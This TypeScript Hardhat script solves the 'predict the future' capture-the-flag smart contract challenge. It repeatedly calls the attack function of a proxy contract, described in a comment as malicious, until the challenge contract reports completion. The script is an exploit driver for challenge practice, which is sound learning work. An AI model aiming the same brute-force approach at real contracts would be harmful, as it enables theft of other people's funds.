import { ethers } from "hardhat";
import { Signer } from "ethers";
import { expect } from "chai";

function delay(ms: number) {
    return new Promise( resolve => setTimeout(resolve, ms) );
}

describe("predictthefuture", function() {
    it("Should solve the predict the future challenge", async function() {
        this.timeout(0);

        let abi = [
            // "function lockInGuess(uint8 n) public payable",
            "function isComplete() public view returns (bool)"
        ];

        const targetAddr = "0x3d03d56429487039eDbeB8ca3d4916696cF01d2a";

        // connect to original contract
        let accounts = await ethers.getSigners();
        let eoa = accounts[0];
        let balance = await eoa.getBalance();
        console.log(ethers.utils.formatEther(balance));

        let contract = new ethers.Contract(targetAddr, abi, ethers.getDefaultProvider());
        let target = contract.connect(eoa);
        
        // deploy proxy contract
        const factory = await ethers.getContractFactory("PredictTheFutureProxy");
        /* 
        const proxyCont = await factory.deploy();
        console.log("Malicious contract deployed");
        */
        const proxyCont = factory.attach("0x7edd46136ED669a5415c6D82650Db0D894BA226c");

        /*
        // lock the guess
        let payval = { value: ethers.utils.parseEther('1') };
        let tx = await proxyCont.guess(targetAddr, payval);
        expect(tx.hash).to.not.be.undefined;
        console.log(tx);
        */

        // brute force
        let tx: String;
        while (await target.isComplete() == false) {
            try {
                let tx = await proxyCont.attack(targetAddr, { gasLimit: 1e5 });
                expect(tx.hash).to.not.be.undefined;
                console.log(tx);

            } catch (e) {
                console.log("err: " + e.message);
            }

            await delay(1000);
       } 
    });        
});